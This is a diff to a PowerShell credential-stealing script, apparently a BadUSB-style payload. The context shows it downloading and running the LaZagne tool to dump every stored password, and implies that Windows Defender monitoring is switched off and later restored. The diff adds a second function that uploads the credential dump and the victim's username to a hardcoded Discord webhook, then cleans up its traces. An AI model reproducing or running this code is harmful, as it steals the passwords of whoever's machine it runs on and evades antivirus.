@@ -89,8 +89,7 @@ Invoke-WebRequest -Uri "https://github.com/AlessandroZ/LaZagne/releases/download
 # Execute the executable and save output to a file
 & "$dir\lazagne.exe" all > "$dir\output.txt"
 
-#Send to discord webhook
-function Upload-Discord {
+function Grab-Data {
 
     [CmdletBinding()]
     param (
@@ -113,7 +112,35 @@ function Upload-Discord {
     if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
     }
     
-    Upload-Discord -text "Met vriendelijke groet, Dhr. Haak" -file "$dir\output.txt"
+    Grab-Data -text "Met vriendelijke groet, Dhr. Haak" -file "$dir\output.txt"
+
+
+function Post-Data {
+
+    [CmdletBinding()]
+    param (
+        [parameter(Position=0,Mandatory=$False)]
+        [string]$file,
+        [parameter(Position=1,Mandatory=$False)]
+        [string]$text 
+    )
+    
+    $hookurl = 'https://discord.com/api/webhooks/1156610163462131783/0f1XmHXMhX3kZQcTK4iWg7eCo9SnBh3Vjj9ULk-Dn2iW9U7QKl7dRrc2YBYkpoKPzgTE'
+    
+    $Body = @{
+      'username' = "Dhr. Haak levert u de gegevens van " + $env:username 
+      'content' = $text
+    }
+    
+    if (-not ([string]::IsNullOrEmpty($text))){
+    Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)};
+    
+    if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
+    }
+    
+    Post-Data -text "Met vriendelijke groet, Dhr. Haak" -file "$dir\output.txt"
+
+    
 # Clean up
 Remove-Item -Path C:\Users\$env:UserName\Downloads\tmp -Recurse -Force
 Set-MpPreference -DisableRealtimeMonitoring $false
